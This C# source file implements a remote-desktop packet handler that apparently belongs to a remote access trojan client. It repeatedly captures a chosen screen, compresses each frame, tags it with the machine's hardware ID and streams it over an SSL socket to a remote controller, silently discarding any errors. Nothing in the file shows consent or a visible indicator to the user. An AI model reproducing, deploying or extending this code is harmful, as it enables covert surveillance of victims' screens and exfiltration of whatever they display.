using Client.MessagePack;
using Client.Sockets;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Net.Sockets;
using Client.Helper;
using System;
using Client.StreamLibrary.UnsafeCodecs;
using Client.StreamLibrary;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;

namespace Client.Handle_Packet
{
   public class HandleRemoteDesktop
    {
        public void CaptureAndSend(int quality, int Scrn)
        {
            try
            {
                TempSocket tempSocket = new TempSocket();

                string hwid = Methods.HWID();
                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
                while (tempSocket.Client.Connected)
                {
                    if (!tempSocket.IsConnected || !ClientSocket.IsConnected) break;
                    Bitmap bmp = GetScreen(Scrn);
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (MemoryStream stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(System.Windows.Forms.Screen.AllScreens.Length);
                            tempSocket.SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                            tempSocket.SslClient.Write(msgpack.Encode2Bytes());
                            tempSocket.SslClient.Flush();
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                tempSocket.Dispose();
            }
            catch { }
        }

        private Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                gfxScreenshot.Dispose();
                return bmpScreenshot;
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }
    }
}
